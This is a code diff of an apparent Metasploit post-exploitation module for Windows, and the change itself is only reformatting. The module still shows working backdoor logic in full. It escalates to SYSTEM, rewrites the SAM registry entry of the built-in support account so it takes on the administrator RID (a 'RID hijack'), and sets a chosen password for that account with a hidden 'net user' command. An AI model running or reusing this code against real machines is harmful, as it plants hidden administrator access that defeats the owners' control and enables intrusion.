@@ -3,31 +3,31 @@ require 'rex'
 
 class Metasploit3 < Msf::Post
 	def initialize(info={})
-                super( update_info( info,
-                                'Name'          => 'Windows Manage - Trojanize support account on servers/workstations',
-                                'Description'   => %q{
-                                                	This module enables alternative access to servers and workstations
-							by modifying the support account's properties. It will enable 
+		super( update_info( info,
+				'Name'          => 'Windows Manage - Trojanize support account on servers/workstations',
+				'Description'   => %q{
+							This module enables alternative access to servers and workstations
+							by modifying the support account's properties. It will enable
 							the account for remote access as the administrator user while
 							taking advantage of some weird behavior in lusrmgr.msc. It will
 							check if sufficient privileges are available for registry operations,
-							otherwis it exits. More info at: http://xangosec.blogspot.com         
-                                        },
-                                'License'       => MSF_LICENSE,
-                                'Author'        => 'salcho <salchoman[at]gmail.com>',
-                                'Platform'      => [ 'win' ],
-                                'SessionTypes'  => [ 'meterpreter' ]
-                        ))
-                register_options(
-                        [
-                                OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
-                                OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
-                        ], self.class)
-        end
+							otherwis it exits. More info at: http://xangosec.blogspot.com
+				},
+				'License'       => MSF_LICENSE,
+				'Author'        => 'salcho <salchoman[at]gmail.com>',
+				'Platform'      => [ 'win' ],
+				'SessionTypes'  => [ 'meterpreter' ]
+			))
+			register_options(
+			[
+				OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
+				OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
+			], self.class)
+	end
 
 	def run
 		if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])
-                        res = session.priv.getsystem
+			res = session.priv.getsystem
 			if !res[0]
 				print_error("You need to run this script as system!")
 				return
@@ -78,11 +78,11 @@ class Metasploit3 < Msf::Post
 					print_good("Swapping RIDs...!")
 					f[0x30, 2] = ["f401"].pack(">H*")
 					u_key.close
-					
+
 					open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{r}", KEY_WRITE)
 					open_key.set_value("F", session.sys.registry.type2str("REG_BINARY"), f)
 					open_key.close
-				
+
 					print_good("Setting password to #{datastore['PASSWORD']}")
 					chan = session.sys.process.execute("cmd.exe /c net user support_388945a0 #{datastore['PASSWORD']}", nil, {'Hidden' => true, 'Channelized' => true})
 					while(d = chan.channel.read)
@@ -90,20 +90,9 @@ class Metasploit3 < Msf::Post
 					end
 				end
 			end
-		
 		else
 			print_error("Couldn't get user's RID...")
 			return
 		end
 	end
-
-
-
-
-
-
-
-
-
-
-	end
+end
